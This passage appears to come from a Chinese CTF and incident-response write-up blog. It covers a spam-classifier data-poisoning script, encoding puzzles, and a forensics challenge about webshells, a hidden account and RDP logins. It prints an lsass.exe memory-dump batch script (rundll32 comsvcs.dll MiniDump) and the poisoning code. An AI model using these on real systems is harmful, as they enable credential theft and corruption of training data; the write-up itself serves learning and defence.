class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[!] 警告: &#x27;not_spam&#x27; 邮件不足 <span class="hljs-subst">&#123;NUM_INJECTIONS&#125;</span> 封。实际可注入数量: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(not_spam_indices)&#125;</span>&quot;</span>,<br>              file=sys.stderr)<br>        <span class="hljs-comment"># 如果不足，就全部使用</span><br>        indices_to_modify = not_spam_indices<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># 否则，随机选择（这里为了结果稳定，直接取前N个）</span><br>        indices_to_modify = not_spam_indices[:NUM_INJECTIONS]<br><br>    injected_count = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> index <span class="hljs-keyword">in</span> indices_to_modify:<br>        original_content_b64 = df.at[index, <span class="hljs-string">&#x27;email_content&#x27;</span>]<br><br>        decoded_content = decode_b64(original_content_b64)<br><br>        <span class="hljs-comment"># 只有成功解码的邮件才进行操作</span><br>        <span class="hljs-keyword">if</span> decoded_content:<br>            <span class="hljs-comment"># 混合原始内容和毒药载荷</span><br>            poisoned_content = decoded_content + <span class="hljs-string">&quot;\n\n--\n\n&quot;</span> + POISON_PAYLOAD<br>            poisoned_content_b64 = encode_b64(poisoned_content)<br><br>            <span class="hljs-keyword">if</span> poisoned_content_b64:<br>                df.at[index, <span class="hljs-string">&#x27;email_content&#x27;</span>] = poisoned_content_b64<br>                injected_count += <span class="hljs-number">1</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 成功向 <span class="hljs-subst">&#123;injected_count&#125;</span> 封 &#x27;not_spam&#x27; 邮件注入了毒药载荷。&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> injected_count &lt; <span class="hljs-number">10</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[!!!] 严重警告：注入的邮件少于10封，攻击将因 min_df=10 的设置而100%失败！&quot;</span>, file=sys.stderr)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-comment"># 保存最终的CSV文件</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[*] 正在将最终结果保存到: <span class="hljs-subst">&#123;OUTPUT_FILE&#125;</span>...&quot;</span>)<br>    df.to_csv(OUTPUT_FILE, index=<span class="hljs-literal">False</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[SUCCESS] 任务完成！&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;请上传 &#x27;<span class="hljs-subst">&#123;OUTPUT_FILE&#125;</span>&#x27; 文件来为模型“洗脱罪名”。&quot;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    create_final_poisoned_dataset()<br></code></pre></td></tr></table></figure><p>上传生成的文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/a942c29e123113d3.png"></p><p>拿到 flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">1</span>SXgqL72aEhV3nK56t4vUwi0PsIBxGCA&#125;<br></code></pre></td></tr></table></figure><h2 id="两个数"><a href="#两个数" class="headerlink" title="两个数"></a>两个数</h2><p>下载附件得到<br><img src="https://img.dkdun.cn/v1/2025/12/fe5d0a84b7f8e293.png"></p><p>第一关，直接询问ai</p><p><img src="https://img.dkdun.cn/v1/2025/12/e2b3166db84ebf3b.png"></p><p>得到密码</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">C0ngr4tu1ation!!Y0u_hav3_passed_th3_first_l3ve1!!<br></code></pre></td></tr></table></figure><p>来到第二关，使用 puzzlesolver</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">01111011011110110111101101111011011110111100100101011001100100010101100101110011000001011101100110001001111100110011100101011001001100010000010100110011111010011101000100000101001100111001000101101001101100011011000101111001000001010011001110010001011110011110100100000101010101011111001101100001<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/19d3179373a9dbf2.png"></p><p>8bit 得到密码</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">y0U_hav3_arriv3_th3_sec0nd_1evel!!!!!<br></code></pre></td></tr></table></figure><p>再看 level3</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">01010110</span> <span class="hljs-number">01110101</span> <span class="hljs-number">01111000</span> <span class="hljs-number">01110010</span> <span class="hljs-number">100000</span> <span class="hljs-number">01111001</span> <span class="hljs-number">100010</span> <span class="hljs-number">01011010</span> <span class="hljs-number">01010100</span> <span class="hljs-number">100000</span> <span class="hljs-number">01011010</span> <span class="hljs-number">01111000</span> <span class="hljs-number">100010</span> <span class="hljs-number">01100111</span> <span class="hljs-number">01110101</span> <span class="hljs-number">100001</span> <span class="hljs-number">01011010</span> <span class="hljs-number">01100100</span> <span class="hljs-number">01111100</span> <span class="hljs-number">01100011</span> <span class="hljs-number">100010</span> <span class="hljs-number">01110101</span> <span class="hljs-number">110001</span> <span class="hljs-number">110001</span> <span class="hljs-number">110001</span> <span class="hljs-number">110001</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bd8de3ecbdd7afa2.png"></p><p>提示格雷码，但是其实是格雷码变体，将每个块分割成多个 2 位组，使用如下映射规则将每个 2 位对转换为 Base4 数字字符</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&#x27;00&#x27; → &#x27;0&#x27;<br><br>&#x27;01&#x27; → &#x27;1&#x27;<br><br>&#x27;11&#x27; → &#x27;2&#x27;<br><br>&#x27;10&#x27; → &#x27;3&#x27;<br></code></pre></td></tr></table></figure><p>最后拿到密码</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">Welc0m3_T0_l3ve1_thr3e!!!!<br></code></pre></td></tr></table></figure><p>puzzlesolver 转图片</p><p><img src="https://img.dkdun.cn/v1/2025/12/2f6ba2e143967712.png"></p><p>然后扫码得到</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">y0u_g3t_th3_l4st_1ev3llllll!!!!!<br></code></pre></td></tr></table></figure><p>给了一堆二进制碎片文件，这里面的文件名很有意思，每个文件名格式：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">bit</span>&gt;</span>.<span class="hljs-tag">&lt;<span class="hljs-name">index</span>&gt;</span><br></code></pre></td></tr></table></figure><p>也就是说 0.1 表示 0 在第 1 位，0.4 表示 0 在第 4 位，以此类推，将所有文件的文件名按位置拼接在一起形成的结果就为 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/0143f794c1f2c4aa.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_bin_seq</span>(<span class="hljs-params">dir_name=<span class="hljs-string">&#x27;last_level&#x27;</span></span>):<br>    r = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">r&#x27;([01])\.(\d+)$&#x27;</span>)<br>    bits = []<br><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> os.scandir(dir_name) <span class="hljs-keyword">as</span> files:<br>            <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> files:<br>                m = r.fullmatch(f.name)<br>                <span class="hljs-keyword">if</span> m:<br>                    b, i = m.groups()<br>                    bits.append((<span class="hljs-built_in">int</span>(i), b))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;目录错误或读取失败&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bits:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&quot;无匹配文件&quot;</span>)<br><br>    bits.sort()<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(b <span class="hljs-keyword">for</span> _, b <span class="hljs-keyword">in</span> bits)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bits_to_txt</span>(<span class="hljs-params">bin_str</span>):<br>    l = <span class="hljs-built_in">len</span>(bin_str)<br>    add = (<span class="hljs-number">8</span> - l % <span class="hljs-number">8</span>) % <span class="hljs-number">8</span><br>    <span class="hljs-keyword">if</span> add:<br>        bin_str += <span class="hljs-string">&#x27;0&#x27;</span> * add<br><br>    hex_chunks = [<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">int</span>(bin_str[i:i+<span class="hljs-number">8</span>], <span class="hljs-number">2</span>))[<span class="hljs-number">2</span>:].zfill(<span class="hljs-number">2</span>)<br>                  <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]<br>    raw = <span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-string">&#x27;&#x27;</span>.join(hex_chunks))<br>    <span class="hljs-keyword">return</span> raw.decode(errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():<br>    <span class="hljs-keyword">try</span>:<br>        bseq = get_bin_seq()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[info] 获取长度: <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(bseq)&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[info] 内容预览: <span class="hljs-subst">&#123;bseq[:<span class="hljs-number">64</span>]&#125;</span>&quot;</span>)<br>        res = bits_to_txt(bseq)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n[+] FLAG:&quot;</span>, res)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> why:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[err]&quot;</span>, why)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    run()<br><br></code></pre></td></tr></table></figure><p>最后拼接结果为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">011001100110110001100001011001110111101100111001001100100110010100110011001100100011000101100001001100010010110100110100001100110110000100110111001011010011001000110110001101100011000100101101011000010110011001100101001101000010110100110110001100010011001000110100001100110011000101100010001101110011100000110010011001100011001101111101</span><br></code></pre></td></tr></table></figure><p>flag 为</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">92</span>e321a1-<span class="hljs-number">43</span>a7-<span class="hljs-number">2661</span>-afe4-<span class="hljs-number">612431</span>b782f3&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>比赛</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>2025年Solar应急响应公益月赛-7月</title>
    <link href="/2025/07/28/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-7%E6%9C%88/"/>
    <url>/2025/07/28/2025%E5%B9%B4Solar%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%AC%E7%9B%8A%E6%9C%88%E8%B5%9B-7%E6%9C%88/</url>
    
    <content type="html"><![CDATA[<p>不得不说这次题量有点大</p><span id="more"></span><h1 id="取证专项"><a href="#取证专项" class="headerlink" title="取证专项"></a>取证专项</h1><h2 id="【任务1】VOL-EASY"><a href="#【任务1】VOL-EASY" class="headerlink" title="【任务1】VOL_EASY"></a>【任务1】VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">黑客上传的一句话木马密码是多少？<br></code></pre></td></tr></table></figure><p>导入 R-Studio，Tools 下有一个 ezshell.php，找到一句话木马</p><p><img src="https://img.dkdun.cn/v1/2025/12/c80af839e9117e32.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">solar</span><br></code></pre></td></tr></table></figure><h2 id="【任务2】VOL-EASY"><a href="#【任务2】VOL-EASY" class="headerlink" title="【任务2】VOL_EASY"></a>【任务2】VOL_EASY</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">黑客使用的木马连接工具叫什么（比如xx.exe）？<span class="hljs-comment">(仅首字母大写)</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ba2ce2f19bd98aa6.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">Antsword.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><h2 id="【任务3】VOL-EASY"><a href="#【任务3】VOL-EASY" class="headerlink" title="【任务3】VOL_EASY"></a>【任务3】VOL_EASY</h2><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript">黑客使用的木马连接工具的位置在哪里（比如C:<span class="hljs-string">\xxxx\xx.exe）</span> ？<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">C</span>:\Tools\AntSword-Loader-v4.<span class="hljs-number">0</span>.<span class="hljs-number">3</span>-win32-x64\AntSword.exe<br></code></pre></td></tr></table></figure><h2 id="【任务4】VOL-EASY"><a href="#【任务4】VOL-EASY" class="headerlink" title="【任务4】VOL_EASY"></a>【任务4】VOL_EASY</h2><figure class="highlight ruleslanguage"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruleslanguage">黑客获取到的<span class="hljs-keyword">FLAG</span>是什么？<br></code></pre></td></tr></table></figure><p>Tools 下有 flag.txt</p><p><img src="https://img.dkdun.cn/v1/2025/12/0d07a7e4137a72f2.png"></p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">flag&#123;ok!get_webshell_is_good_idea~&#125;<br></code></pre></td></tr></table></figure><h2 id="【任务5】VOL-EASY"><a href="#【任务5】VOL-EASY" class="headerlink" title="【任务5】VOL_EASY"></a>【任务5】VOL_EASY</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">题目描述<br>黑客入侵的网站地址是多少（只需要http<span class="hljs-punctuation">:</span><span class="hljs-comment">//xxxxx/）？</span><br></code></pre></td></tr></table></figure><p>在 lovelymem 中搜索 Administrator 找到了疑似网站的信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/1cb0eaebdfa763cd.png"></p><p>继续搜索字符串 Administrator@<a href="http://0.0.0.192/">http://192</a></p><p><img src="https://img.dkdun.cn/v1/2025/12/0d4f5d73af50d58c.png"></p><p>找到网站</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">http:</span><span class="hljs-comment">//192.168.186.140</span><br></code></pre></td></tr></table></figure><h2 id="【任务6】VOL-EASY"><a href="#【任务6】VOL-EASY" class="headerlink" title="【任务6】VOL_EASY"></a>【任务6】VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">黑客入侵时，使用的系统用户名是什么？<br></code></pre></td></tr></table></figure><p>查看系统信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/f1eb625ab75aa547.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Administrator</span><br></code></pre></td></tr></table></figure><h2 id="【任务7】VOL-EASY"><a href="#【任务7】VOL-EASY" class="headerlink" title="【任务7】VOL_EASY"></a>【任务7】VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">黑客创建隐藏账户的密码是多少？<br></code></pre></td></tr></table></figure><p>搜索 net user 发现在添加用户 solar$</p><p><img src="https://img.dkdun.cn/v1/2025/12/9c96fab7ac010942.png"></p><p>继续搜索 net user solar</p><p><img src="https://img.dkdun.cn/v1/2025/12/3e8a4cb94f06b6a8.png"></p><p>成功找到密码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">solar2025<br></code></pre></td></tr></table></figure><h2 id="【任务8】VOL-EASY"><a href="#【任务8】VOL-EASY" class="headerlink" title="【任务8】VOL_EASY"></a>【任务8】VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">黑客首次操作靶机的关键程序是什么？<br></code></pre></td></tr></table></figure><p>Tools 下有个 dump_lass.bat 脚本</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs dos">@<span class="hljs-built_in">echo</span> off<br><span class="hljs-built_in">echo</span> [*] 正在获取 lsass.exe PID...<br><br><span class="hljs-keyword">for</span> /f &quot;tokens=<span class="hljs-number">2</span> delims=,&quot; <span class="hljs-variable">%%a</span> <span class="hljs-keyword">in</span> (&#x27;tasklist /FI &quot;IMAGENAME eq lsass.exe&quot; /FO CSV /NH&#x27;) <span class="hljs-keyword">do</span> (<br>    <span class="hljs-built_in">set</span> PID=<span class="hljs-variable">%%~</span>a<br>)<br><br><span class="hljs-keyword">if</span> &quot;<span class="hljs-variable">%PID%</span>&quot;==&quot;&quot; (<br>    <span class="hljs-built_in">echo</span> [!] 未找到 lsass.exe 进程，或没有权限。<br>    <span class="hljs-built_in">pause</span><br>    <span class="hljs-keyword">exit</span> /b <span class="hljs-number">1</span><br>)<br><br><span class="hljs-built_in">echo</span> [*] PID: <span class="hljs-variable">%PID%</span><br><span class="hljs-built_in">echo</span> [*] 正在尝试导出内存转储...<br><br><span class="hljs-built_in">set</span> OUTPUT=%~dp0lsass.dmp<br><br>rundll32.exe comsvcs.dll, MiniDump <span class="hljs-variable">%PID%</span> <span class="hljs-variable">%OUTPUT%</span> full<br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">exist</span> &quot;<span class="hljs-variable">%OUTPUT%</span>&quot; (<br>    <span class="hljs-built_in">echo</span> [✓] 成功导出 lsass 内存为: <span class="hljs-variable">%OUTPUT%</span><br>) <span class="hljs-keyword">else</span> (<br>    <span class="hljs-built_in">echo</span> [!] 导出失败，可能权限不足。<br>)<br><br><span class="hljs-built_in">pause</span><br><br></code></pre></td></tr></table></figure><p>导出了 lsass.exe 的内存信息，包含 PID，转存输出的路径，010 打开镜像文件搜索 lsass.exe，找到相关信息</p><p><img src="https://img.dkdun.cn/v1/2025/12/cb92e3f7e2256c60.png"></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim">lsass.<span class="hljs-keyword">exe</span><br></code></pre></td></tr></table></figure><h2 id="【任务9】VOL-EASY"><a href="#【任务9】VOL-EASY" class="headerlink" title="【任务9】VOL_EASY"></a>【任务9】VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该关键程序的PID是多少？<br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">456<br></code></pre></td></tr></table></figure><h2 id="【任务10】VOL-EASY"><a href="#【任务10】VOL-EASY" class="headerlink" title="【任务10】VOL_EASY"></a>【任务10】VOL_EASY</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">该关键程序的内存文件保存到了什么地方？<br></code></pre></td></tr></table></figure><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">C:</span>\phpstudy_pro\WWW\lsass.dmp<br></code></pre></td></tr></table></figure><h1 id="应急响应"><a href="#应急响应" class="headerlink" title="应急响应"></a>应急响应</h1><h2 id="【任务1】应急大师"><a href="#【任务1】应急大师" class="headerlink" title="【任务1】应急大师"></a>【任务1】应急大师</h2><p><img src="https://img.dkdun.cn/v1/2025/12/89cb689a675bbd2f.png"></p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">solar<span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure><h2 id="【任务2】应急大师"><a href="#【任务2】应急大师" class="headerlink" title="【任务2】应急大师"></a>【任务2】应急大师</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">请提交黑客的<span class="hljs-built_in">IP</span>地址？<br></code></pre></td></tr></table></figure><p>查看 nginx.log.txt 文件找到 IP</p><p><img src="https://img.dkdun.cn/v1/2025/12/473f70b24773d0d0.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.186.139</span><br></code></pre></td></tr></table></figure><h2 id="【任务3】应急大师"><a href="#【任务3】应急大师" class="headerlink" title="【任务3】应急大师"></a>【任务3】应急大师</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">请提交黑客的一句话木马密码？<br></code></pre></td></tr></table></figure><p>uploads 目录下有两个 php 文件</p><p><img src="https://img.dkdun.cn/v1/2025/12/39000dad2e1df55d.png"></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">solar2025<br></code></pre></td></tr></table></figure><h2 id="【任务4】应急大师"><a href="#【任务4】应急大师" class="headerlink" title="【任务4】应急大师"></a>【任务4】应急大师</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">请提交黑客创建隐藏用户的TargetSid（目标账户安全ID）？<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/bcc8e058e7960a25.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">S</span>-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">3845547894</span>-<span class="hljs-number">970975367</span>-<span class="hljs-number">1760185533</span>-<span class="hljs-number">1000</span><br></code></pre></td></tr></table></figure><h2 id="【任务5】应急大师"><a href="#【任务5】应急大师" class="headerlink" title="【任务5】应急大师"></a>【任务5】应急大师</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">请提交黑客创建隐藏账户的事件（格式为 年<span class="hljs-regexp">/月/</span>日 时:分:秒）？<br></code></pre></td></tr></table></figure><p>打开事件查看器查看安全日志，发现在 2025&#x2F;7&#x2F;23 17:05:45 时账户被更改为 solar$</p><p><img src="https://img.dkdun.cn/v1/2025/12/a67a8300fecca4be.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2025</span>/<span class="hljs-number">7</span>/<span class="hljs-number">23</span> <span class="hljs-number">17</span>:<span class="hljs-number">05</span>:<span class="hljs-number">45</span><br></code></pre></td></tr></table></figure><h2 id="【任务6】应急大师"><a href="#【任务6】应急大师" class="headerlink" title="【任务6】应急大师"></a>【任务6】应急大师</h2><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">黑客将这个隐藏用户先后加入了哪几个用户组？提交格式为 第一个用户组-第二个用户组，如student-teacher<br></code></pre></td></tr></table></figure><p>可以发现先后添加了两个用户组</p><p><img src="https://img.dkdun.cn/v1/2025/12/cdc0c17879d19d88.png"></p><p><img src="https://img.dkdun.cn/v1/2025/12/9057281cc607cdb7.png"></p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">Users-Administrators</span><br></code></pre></td></tr></table></figure><h2 id="【任务7】应急大师"><a href="#【任务7】应急大师" class="headerlink" title="【任务7】应急大师"></a>【任务7】应急大师</h2><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm">黑客通过远程桌面成功登陆系统管理员账号的网络地址及端口号？提交格式为 <span class="hljs-built_in">IP</span>:PORT 如 <span class="hljs-number">127</span>.<span class="hljs-number">0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">41110</span><br></code></pre></td></tr></table></figure><p>继续看日志发现在 17:09:41 时进行 rdp 连接</p><p><img src="https://img.dkdun.cn/v1/2025/12/b88cfcd8500d0859.png"></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">192.168.186.139:49197</span><br></code></pre></td></tr></table></figure><h2 id="【任务1】公交车系统攻击事件排查"><a href="#【任务1】公交车系统攻击事件排查" class="headerlink" title="【任务1】公交车系统攻击事件排查"></a>【任务1】公交车系统攻击事件排查</h2><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">题目描述</span><br><span class="language-xml">分析环境内的中间件日志，找到第一个漏洞(黑客获取数据的漏洞)，然后通过分析日志、流量，通过脚本解出黑客获取的用户密码数据，提交获取的前两个用户名，提交格式：flag</span><span class="hljs-template-variable">&#123;zhangsan-wangli&#125;</span><br></code></pre></td></tr></table></figure><p>ssh 连上之后 ftp 查看文件，在 web 目录的 src&#x2F;includes 路径下找到 db.php</p><p><img src="https://img.dkdun.cn/v1/2025/12/234a901ffc926d31.png"></p><p>拿到登录密码账户</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">mysql</span> -h <span class="hljs-number">127.0.0.1</span> -u bussec -pbussec123.. bus_system<br></code></pre></td></tr></table></figure><p>在 <code>/var/www/db/</code>发现数据库文件 bus_system.sql，table 为 <code>bus_drivers</code></p><p><img src="https://img.dkdun.cn/v1/2025/12/7c954ff7044e3e72.png"></p><p>登录进去查找</p><p><img src="https://img.dkdun.cn/v1/2025/12/49f7af6b70397f4b.png"></p><p>需要以 password 